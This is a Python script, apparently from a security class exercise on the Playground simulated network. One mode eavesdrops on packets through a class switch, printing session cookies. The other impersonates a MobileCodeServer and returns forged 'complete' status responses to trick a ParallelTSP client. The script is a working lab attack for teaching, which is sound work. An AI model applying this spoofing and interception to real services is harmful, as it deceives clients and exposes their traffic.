import playground
import sys
import asyncio
from playground.network.common import StackingProtocol, StackingTransport, StackingProtocolFactory
from MobileCodeService.Packets import *

from playground.common import logging as p_logging
p_logging.EnablePresetLogging(p_logging.PRESET_TEST)


"""
Goal:

Impersonate a MobileCodeServer to trick the ParallelTSP Program.

Steps:

Find the server that the ParallelTSP Program talks to not over PLS.
Eavesdrop on the packets between those two servers.
When a GetMobileCodeStatus comes in,
trick the ParallelTSP program by sending a finished response.
Observe the packets to show that ParallelTSP tries to get the result.
"""

"""
Demux: Eavesdrops on all messages going through a switch
The class switch is located at 192.168.200.240:9090
"""
class Demux(asyncio.Protocol):

    def connectionMade():
        pass

    def demux(src, srcPort, dst, dstPort, demuxData):
        if src not in ['20174.1.1337.1', '20174.1.1337.2'] or dst not in ['20174.1.1337.1', '20174.1.1337.2']:
            return
        print("Packet from ", src, ":", srcPort, ". Going to ", dst, ":", dstPort)
#        print("Data: ", demuxData)

        deserializer = MobileCodePacket.Deserializer()
        deserializer.update(demuxData)
        for packet in deserializer.nextPackets():
            if isinstance(packet, GetMobileCodeStatus):
                print("--------Get Mobile Code Status--------")
                print("Cookie: ", packet.Cookie)
            elif isinstance(packet, GetMobileCodeStatusResponse):
                print("--------Get Mobile Code Status Response--------")
                print("Cookie: ", packet.Cookie)
                print("Complete: ", packet.Complete)
                print("Runtime: ", packet.Runtime)
            else:
                print(demuxData)


class flag1(asyncio.Protocol):

    def __init__(self):
        self.deserializer = MobileCodePacket.Deserializer()

    def connection_made(self, transport):
        self.transport = transport

    def data_received(self, data):
        print("-----flag1 data received-----")
        self.deserializer.update(data)
        for packet in self.deserializer.nextPackets():
            if isinstance(packet, GetMobileCodeStatus):
                print("sent response")
                packet_back = GetMobileCodeStatusResponse()
                packet_back.Cookie = packet.Cookie
                packet_back.Complete = True
                packet_back.Runtime = 11
                self.transport.write(packet_back.__serialize__())


if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) != 1:
        print("options: listen or flag1")
    else:
        if (args[0] == "listen"):
            eavesdrop = playground.network.protocols.switching.PlaygroundSwitchTxProtocol(Demux, "20174.*.*.*")
            coro = asyncio.get_event_loop().create_connection(lambda: eavesdrop, "192.168.200.240", 9090)
            loop = asyncio.get_event_loop()
            socket, client_proto = loop.run_until_complete(coro)
            loop.run_forever()
        elif (args[0] == "flag1"):
            loop = asyncio.get_event_loop()
            loop.set_debug(enabled=True)
            coro = playground.getConnector().create_playground_server(
                flag1, 1, host="20174.1.1337.2")
            server = loop.run_until_complete(coro)
            loop.run_forever()
